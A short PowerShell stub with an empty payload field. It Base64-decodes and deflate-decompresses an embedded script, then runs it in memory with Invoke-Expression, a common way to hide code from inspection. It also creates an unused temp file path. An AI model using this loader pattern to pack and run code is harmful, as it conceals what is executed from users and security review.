$body = ""
$scriptSize = 483330
$file = [System.IO.Path]::GetTempFileName() + ".ps1"
$zipBytes = [System.Convert]::FromBase64String($body)
$zipStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Byte[]]$zipBytes,[IO.Compression.CompressionMode]::Decompress)
$scriptBin = New-Object Byte[]($scriptSize)
$zipStream.Read($scriptBin, 0, $scriptSize) | Out-Null
$script = [System.Text.Encoding]::UTF8.GetString($scriptBin)
IEX $script
